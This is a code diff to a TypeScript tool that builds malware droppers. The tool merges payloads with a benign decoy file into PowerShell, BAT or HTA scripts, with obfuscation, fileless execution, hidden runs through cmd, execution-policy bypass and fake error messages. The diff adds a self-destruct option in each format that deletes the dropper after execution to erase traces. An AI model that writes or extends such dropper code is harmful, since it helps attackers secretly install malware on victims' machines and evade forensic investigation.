@@ -18,6 +18,7 @@ const MergePayloadsInputSchema = z.object({
   executionDelay: z.string().optional(),
   fileless: z.boolean().optional(),
   fakeErrorMessage: z.string().optional(),
+  selfDestruct: z.boolean().optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -55,7 +56,8 @@ const generatePowershellDropper = (
     useFragmentation?: boolean,
     executionDelay?: string,
     fileless?: boolean,
-    fakeErrorMessage?: string
+    fakeErrorMessage?: string,
+    selfDestruct?: boolean
 ): string => {
     
     let delaySection = '';
@@ -68,6 +70,15 @@ const generatePowershellDropper = (
         fakeErrorSection = `
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("${fakeErrorMessage}", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+        `;
+    }
+    
+    let selfDestructSection = '';
+    if (selfDestruct) {
+        selfDestructSection = `
+try {
+    Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
+} catch {}
         `;
     }
 
@@ -160,6 +171,8 @@ ${benignBase64}
     ${payloadProcessingLoops}
 } catch {
     # Fail silently
+} finally {
+    ${selfDestructSection}
 }
 `;
 };
@@ -172,7 +185,7 @@ ${benignBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage } = validatedInput;
+    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct } = validatedInput;
 
     const processedPayloads = payloads.map(payload => {
         let payloadBase64 = decodeDataUri(payload.content);
@@ -194,13 +207,17 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage);
+            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage);
+            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
-            scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
+            let batContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
+            if(selfDestruct) {
+                batContent += `\n(goto) 2>nul & del "%~f0"`;
+            }
+            scriptContent = batContent;
             break;
 
         case 'hta':
@@ -259,6 +276,15 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 objShell.Run "cmd /c """ & tempPath & "\\${payload.name}" & """", 0, False
                 `;
             }).join('\n');
+            
+            let selfDestructHta = '';
+            if (selfDestruct) {
+                selfDestructHta = `
+                On Error Resume Next
+                objFSO.DeleteFile(window.document.location.pathname)
+                On Error GoTo 0
+                `;
+            }
 
             const vbsPayload = `
                 Set objShell = CreateObject("WScript.Shell")
@@ -276,6 +302,8 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 ${executionDelay ? `WScript.Sleep ${parseInt(executionDelay, 10) * 1000}` : ''}
                 
                 ${payloadProcessingVbs}
+                
+                ${selfDestructHta}
 
                 ' Close the HTA window
                 window.close()
